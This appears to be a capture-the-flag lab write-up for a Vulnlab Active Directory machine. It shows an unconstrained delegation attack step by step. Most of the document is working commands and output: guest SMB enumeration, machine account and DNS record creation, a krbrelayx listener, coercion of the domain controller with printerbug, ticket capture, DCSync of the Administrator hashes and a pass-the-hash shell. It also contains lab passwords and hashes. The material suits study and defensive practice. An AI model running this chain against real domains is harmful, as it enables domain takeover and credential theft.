## Enumeration
### Method1
```
*Evil-WinRM* PS C:\> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                                                    State
============================= ============================================================== =======
...
SeEnableDelegationPrivilege   Enable computer and user accounts to be trusted for delegation Enabled
...
```
### Method2
```
➜  nxc smb 10.10.68.115 -u 'a' -p '' --share SYSVOL --get-file "delegate.vl/Policies/{6AC1786C-016F-11D2-945F-00C04fB984F9}/MACHINE/Microsoft/Windows NT/SecEdit/GptTmpl.inf" GptTmpl.inf
SMB         10.10.68.115    445    DC1              [*] Windows Server 2022 Build 20348 x64 (name:DC1) (domain:delegate.vl) (signing:True) (SMBv1:False)
SMB         10.10.68.115    445    DC1              [+] delegate.vl\a: (Guest)
SMB         10.10.68.115    445    DC1              [*] Copying "delegate.vl/Policies/{6AC1786C-016F-11D2-945F-00C04fB984F9}/MACHINE/Microsoft/Windows NT/SecEdit/GptTmpl.inf" to "GptTmpl.inf"
SMB         10.10.68.115    445    DC1              [+] File "delegate.vl/Policies/{6AC1786C-016F-11D2-945F-00C04fB984F9}/MACHINE/Microsoft/Windows NT/SecEdit/GptTmpl.inf" was downloaded to "GptTmpl.inf"
```

```
➜  cat GptTmpl.inf
...
SeEnableDelegationPrivilege = *S-1-5-21-1484473093-3449528695-2030935120-1108,*S-1-5-32-544
```

`S-1-5-21-1484473093-3449528695-2030935120-1108` is the SID of the user `N.Thompson`
```
➜  nxc smb delegate.vl -u 'a' -p '' --rid-brute
SMB         10.10.83.107    445    DC1              [*] Windows Server 2022 Build 20348 x64 (name:DC1) (domain:delegate.vl) (signing:True) (SMBv1:False)
SMB         10.10.83.107    445    DC1              [+] delegate.vl\a: (Guest)
...
SMB         10.10.83.107    445    DC1              1108: DELEGATE\N.Thompson (SidTypeUser)
...
```
## Attack
### Verify That MachineAccountQuota Is Not Set to Zero
```bash
➜  delegate nxc ldap dc1 -u n.thompson -p KALEB_2341 -M maq
LDAP        10.10.68.115    389    DC1              [*] Windows Server 2022 Build 20348 (name:DC1) (domain:delegate.vl)
LDAP        10.10.68.115    389    DC1              [+] delegate.vl\n.thompson:KALEB_2341
MAQ         10.10.68.115    389    DC1              [*] Getting the MachVerify That MachineAccountQuota Is Not Set to ZeroineAccountQuota
MAQ         10.10.68.115    389    DC1              MachineAccountQuota: 10
```
### Create a new computer account
```
(venv) ➜  addcomputer.py delegate.vl/n.thompson:KALEB_2341 -computer-name serio -computer-pass Password123
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies

[*] Successfully added machine account serio$ with password Password123.
```
### Add a new DNS record
```
(venv) ➜  python3 krbrelayx/dnstool.py -u 'delegate.vl\serio$' -p Password123 -r serio.delegate.vl -d 10.8.0.210 --action add DC1.delegate.vl -dns-ip 10.10.83.107
[-] Connecting to host...
[-] Binding to host
[+] Bind OK
[-] Adding new record
[+] LDAP operation completed successfully
```
verify it's there
```
(venv) ➜  python krbrelayx/dnstool.py -u 'delegate\serio$' -p Password123 -r serio.delegate.vl -d 10.8.0.210 --action query DC1.delegate.vl -dns-ip 10.10.83.107
[-] Connecting to host...
[-] Binding to host
[+] Bind OK
[+] Found record serio
DC=serio,DC=Delegate.vl,CN=MicrosoftDNS,DC=DomainDnsZones,DC=delegate,DC=vl
[+] Record entry:
 - Type: 1 (A) (Serial: 235)
 - Address: 10.8.0.210
```
### Add the TRUSTED_FOR_DELEGATION flag to the machine account we created
```
(venv) ➜  bloodyAD -u n.thompson -p KALEB_2341 --host DC1.delegate.vl add uac 'serio$' -f TRUSTED_FOR_DELEGATION
[-] ['TRUSTED_FOR_DELEGATION'] property flags added to serio$'s userAccountControl
```
### Verify that the attribute was successfully written
```
(venv) ➜  ldapdomaindump -u 'delegate.vl\n.thompson' -p KALEB_2341 delegate.vl
[*] Connecting to host...
[*] Binding to host
[+] Bind OK
[*] Starting domain dump
[+] Domain dump finished
(venv) ➜  grep TRUSTED_FOR_DELEGATION domain_computers.grep
serio   serio$                                  01/01/01 00:00:00       WORKSTATION_ACCOUNT, TRUSTED_FOR_DELEGATION     01/31/25 16:03:15       S-1-5-21-1484473093-3449528695-2030935120-3101
DC1     DC1$    DC1.delegate.vl Windows Server 2022 Standard            10.0 (20348)    01/31/25 16:03:32       SERVER_TRUST_ACCOUNT, TRUSTED_FOR_DELEGATION    08/26/23 09:40:08       S-1-5-21-1484473093-3449528695-2030935120-1000
```
or
```
(venv) ➜  bloodyAD --host dc1.delegate.vl -d delegate.vl -u n.thompson -p KALEB_2341 get object serio$ | grep userAccountControl
userAccountControl: WORKSTATION_TRUST_ACCOUNT; TRUSTED_FOR_DELEGATION
```
### Add SPN
```
(venv) ➜  python3 krbrelayx/addspn.py -u delegate.vl\\n.thompson -p KALEB_2341 -s cifs/serio.delegate.vl -t serio$ -dc-ip 10.10.83.107 DC1.delegate.vl --additional
[-] Connecting to host...
[-] Binding to host
[+] Bind OK
[+] Found modification target
[+] SPN Modified successfully
```

```
(venv) ➜  python3 krbrelayx/addspn.py -u delegate.vl\\n.thompson -p KALEB_2341 -s cifs/serio.delegate.vl -t serio$ -dc-ip 10.10.83.107 DC1.delegate.vl
[-] Connecting to host...
[-] Binding to host
[+] Bind OK
[+] Found modification target
[+] SPN Modified successfully
```
### Start krbrelayx
The NT Hash can be generated using online tools like CyberChef or:
```
➜  delegate echo -n 'Password123' | iconv -t utf-16le | openssl md4 -provider legacy | cut -d' ' -f2
58a478135a93ac3bf058a5ea0e8fdb71
```
```
(venv) ➜  python3 krbrelayx/krbrelayx.py -hashes :58A478135A93AC3BF058A5EA0E8FDB71 --interface-ip 10.8.0.210
[*] Protocol Client HTTPS loaded..
[*] Protocol Client HTTP loaded..
[*] Protocol Client LDAPS loaded..
[*] Protocol Client LDAP loaded..
[*] Protocol Client SMB loaded..
[*] Running in export mode (all tickets will be saved to disk). Works with unconstrained delegation attack only.
[*] Running in unconstrained delegation abuse mode using the specified credentials.
[*] Setting up SMB Server
[*] Setting up HTTP Server on port 80
[*] Setting up DNS Server

[*] Servers started, waiting for connections
```
### Trigger the exploit
```
(venv) ➜  python3 krbrelayx/printerbug.py 'serio$:Password123'@10.10.83.107 serio.delegate.vl
[*] Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies

[*] Attempting to trigger authentication via rprn RPC at 10.10.83.107
[*] Bind OK
[*] Got handle
DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied
[*] Triggered RPC backconnect, this may or may not have worked
```
### krbrelayx output
```
[*] SMBD: Received connection from 10.10.83.107
[*] Got ticket for DC1$@DELEGATE.VL [krbtgt@DELEGATE.VL]
[*] Saving ticket in DC1$@DELEGATE.VL_krbtgt@DELEGATE.VL.ccache
[*] SMBD: Received connection from 10.10.83.107
[-] Unsupported MechType 'NTLMSSP - Microsoft NTLM Security Support Provider'
[*] SMBD: Received connection from 10.10.83.107
[-] Unsupported MechType 'NTLMSSP - Microsoft NTLM Security Support Provider'
```

```
(venv) ➜  export KRB5CCNAME=DC1\$@DELEGATE.VL_krbtgt@DELEGATE.VL.ccache
```

```
(venv) ➜  klist
Ticket cache: FILE:DC1$@DELEGATE.VL_krbtgt@DELEGATE.VL.ccache
Default principal: DC1$@DELEGATE.VL

Valid starting     Expires            Service principal
31/01/25 17:09:26  01/02/25 03:03:29  krbtgt/DELEGATE.VL@DELEGATE.VL
        renew until 07/02/25 17:03:29
```
### DCSync
```
(venv) ➜  secretsdump.py -k -no-pass dc1.delegate.vl -just-dc-user administrator
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies

[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:c32198ceab4cc695e65045562aa3ee93:::
[*] Kerberos keys grabbed
Administrator:aes256-cts-hmac-sha1-96:f877adcb278c4e178c430440573528db38631785a0afe9281d0dbdd10774848c
Administrator:aes128-cts-hmac-sha1-96:3a25aca9a80dfe5f03cd03ea2dcccafe
Administrator:des-cbc-md5:ce257f16ec25e59e
[*] Cleaning up...
```

```
➜  evil-winrm -i dc1.delegate.vl -u administrator -H c32198ceab4cc695e65045562aa3ee93

Evil-WinRM shell v3.7

Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Administrator\Documents> 
```
## Resources
- https://dirkjanm.io/krbrelayx-unconstrained-delegation-abuse-toolkit/
- https://www.thehacker.recipes/ad/movement/kerberos/delegations/unconstrained
- https://blog.netwrix.com/2022/12/02/unconstrained-delegation/
- https://exploit.ph/user-constrained-delegation.html
- https://www.vulnlab.com/machines